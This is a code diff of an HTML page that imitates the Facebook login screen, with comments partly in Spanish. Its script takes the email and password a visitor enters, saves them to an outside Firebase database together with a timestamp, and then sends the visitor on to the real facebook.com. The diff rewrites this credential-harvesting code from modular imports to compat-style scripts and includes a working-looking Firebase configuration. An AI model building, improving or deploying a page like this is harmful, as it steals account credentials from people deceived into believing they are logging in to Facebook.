@@ -122,7 +122,6 @@
   </style>
 </head>
 <body>
-
 <div class="login-container">
   <div class="branding">
     <h1 class="title">facebook</h1>
@@ -145,48 +144,43 @@
   </div>
 </div>
 
-<script type="module">
-  // Import Firebase
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-
-  // Firebase configuration
+<script src="https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js"></script>
+<script>
+  // Configuración de Firebase
   const firebaseConfig = {
     apiKey: "AIzaSyA-okgbyWo2fSd41521MGYrRdwE8Kj8UDY",
     authDomain: "face-7efc6.firebaseapp.com",
     projectId: "face-7efc6",
-    storageBucket: "face-7efc6.firebasestorage.app",
+    storageBucket: "face-7efc6.appspot.com",
     messagingSenderId: "1035061315837",
     appId: "1:1035061315837:web:74509849ccb74ef7a61694"
   };
 
-  // Initialize Firebase
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
+  // Inicializar Firebase
+  const app = firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
 
-  // Handle form submission
+  // Manejo del formulario
   document.getElementById('login-form').addEventListener('submit', async (e) => {
-    e.preventDefault(); // Prevent default form submission
+    e.preventDefault();
 
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
     try {
-      // Save to Firestore
-      await addDoc(collection(db, "users"), {
+      await db.collection("users").add({
         email,
         password,
-        createdAt: serverTimestamp()
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
       });
       alert("Datos guardados exitosamente.");
-      // Redirect to Facebook
       window.location.href = "https://www.facebook.com";
     } catch (error) {
       console.error("Error al guardar los datos:", error);
-      alert("Hubo un error al guardar los datos.");
+      alert(`Hubo un error al guardar los datos: ${error.message}`);
     }
   });
 </script>
-
 </body>
 </html>
